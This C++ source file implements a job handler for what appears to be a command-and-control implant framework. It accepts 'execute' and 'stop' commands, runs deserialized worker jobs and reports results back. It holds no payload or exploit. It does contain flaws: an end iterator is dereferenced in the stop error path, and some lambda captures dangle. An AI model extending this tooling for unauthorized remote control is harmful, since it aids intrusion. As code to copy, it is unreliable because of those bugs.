#include "job.h"

#include <util/string.hpp>
#include <util/debug.hpp>

#include "worker.h"

namespace handler {

  job::job(state* state) : _state(state), _worker_thread{std::async(std::launch::async, [this] { process(); }) } {
    on_message_connection = _state->dispatcher.signal_message_received.connect<&job::on_message>(this);
  }

  job::~job() {
    _message_queue.stop();
    for (auto const& [id, job] : _jobs)
      job->stop(true);
  }

  void job::process() {
    while (true) {
      try {
        auto item = _message_queue.wait_and_pop();
        auto implant = item->first;
        auto message = item->second;
        if (util::string::compare_insensitive(message->command, "execute")) {
          try {
            auto job = std::make_shared<worker::job>(shared::abstract::worker::deserialize(message->data), _state);
            job->signal_worker_stopped.connect([&, job](const std::string &id) {
              DEBUG_PRINT("Job '%s' has completed\n", id);
              auto result = std::make_shared<shared::message>(message->id, id, "", "job_handler", "completed", job->output(), true);
              _state->dispatcher.send(implant, result);
              std::scoped_lock<std::mutex> lock{_jobs_mutex};
              _jobs.erase(id);
            });
            job->signal_worker_output.connect([&](const std::string &output) {
              std::string::size_type pos = output.find_last_not_of("\n \t");
              if (pos != std::string::npos)
                DEBUG_PRINT("Job '%s' output...\n%s", job->id(), output);
              else
                DEBUG_PRINT("Job '%s' output...\n%s\n", job->id(), output);
              //auto result = std::make_shared<shared::message>(message->id, job->id(), "", "job_handler", "executing", output, true);
              //_state->dispatcher.send(implant, result);
            });
            bool success = job->start();
            if (success) {
              std::scoped_lock<std::mutex> lock{_jobs_mutex};
              DEBUG_PRINT("Job '%s' has started\n", job->id());
              _jobs[job->id()] = job;
              auto result = std::make_shared<shared::message>(message->id, job->id(), "", "job_handler", "executing", "", true);
              _state->dispatcher.send(implant, result);
            } else {
              ERROR_PRINT("Unable to start job '%s':\n%s", job->id(), job->output());
              auto result = std::make_shared<shared::message>(message->id, job->id(), "", "job_handler", "executing", job->output(), false);
              _state->dispatcher.send(implant, result);
            }
          }
          catch (const std::exception &e) {
            ERROR_PRINT("Unable to create job, %s\n", e.what());
            auto result = std::make_shared<shared::message>(message->id,
                                                            "job_handler",
                                                            "execute",
                                                            std::string("invalid job, ").append(e.what()),
                                                            false);
            _state->dispatcher.send(implant, result);
          }
        }
        else if (util::string::compare_insensitive(message->command, "stop")) {
          std::scoped_lock<std::mutex> lock{_jobs_mutex};
          if (auto it = _jobs.find(message->data); it != _jobs.end()) {
            auto job = it->second;
            if (job->is_running()) {
              job->stop(false);
            }
            auto result = std::make_shared<shared::message>(message->id, job->id(), "", "job_handler", "stopping", "", true);
            DEBUG_PRINT("Job '%s' is stopping\n", job->id());
            _state->dispatcher.send(implant, result);
          }
          else {
            ERROR_PRINT("Unable to stop job '%s', it is not running\n", it->second->id());
            auto result = std::make_shared<shared::message>(message->id, it->second->id(), "", "job_handler", message->command, "not running", false);
            _state->dispatcher.send(implant, result);
          }
        }
        else {
          ERROR_PRINT("Invalid job handler command '%s', received in message '%s'\n", message->command, message->id);
          auto result = std::make_shared<shared::message>(message->id, "job_handler", message->command, "invalid command", false);
          _state->dispatcher.send(implant, result);
        }
      }
      catch (const queue_stopped& e) {
        break;
      }
    }
  }

  std::vector<std::pair<std::string, std::string>> job::list() {
    std::scoped_lock<std::mutex> lock{ _jobs_mutex };
    std::vector<std::pair<std::string, std::string>> list;
    for (auto const& [id, job] : _jobs)
      list.emplace_back(job->id(), job->name());
    return list;
  }

  void job::on_message(const std::string& implant, std::shared_ptr<shared::message> message)
  {
    if (util::string::compare_insensitive(message->type, "job_handler")) {
      auto item = std::make_shared<queue_item>(implant, message);
      DEBUG_PRINT("Received 'job_handler' message, '%s'\n", item->second->id);
      _message_queue.push(item);
    }
  }

}
